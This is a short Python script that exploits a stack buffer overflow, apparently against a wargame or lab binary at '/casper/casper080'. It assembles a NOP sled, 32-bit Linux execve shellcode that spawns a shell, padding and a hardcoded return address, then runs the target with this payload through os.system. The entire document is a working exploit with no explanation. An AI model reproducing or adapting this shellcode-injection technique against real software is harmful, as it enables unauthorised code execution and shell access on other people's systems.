import os

shellcode_sh = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
shellcode_xh = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x78\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

sc_length = 21
nop_sled_length = 400
distance_to_return = 999
buf_length = 987

nop_sled = nop_sled_length * "\x90"

#return_address = "\xc5\xf1\xff\xbf" #0xbffff1c5
#return_address = "\xf5\xec\xff\xbf" #0xbfffecf5
return_address = "\x35\xee\xff\xbf" # BFFFEE35 = 320 after start of buffer
overflow_buffer = "U" * (buf_length - nop_sled_length - sc_length)
overflow_mem = "\x90" * (distance_to_return - buf_length)

data = nop_sled + shellcode_xh + overflow_buffer + overflow_mem + return_address
#print(data)
os.system("/casper/casper080 " + data)
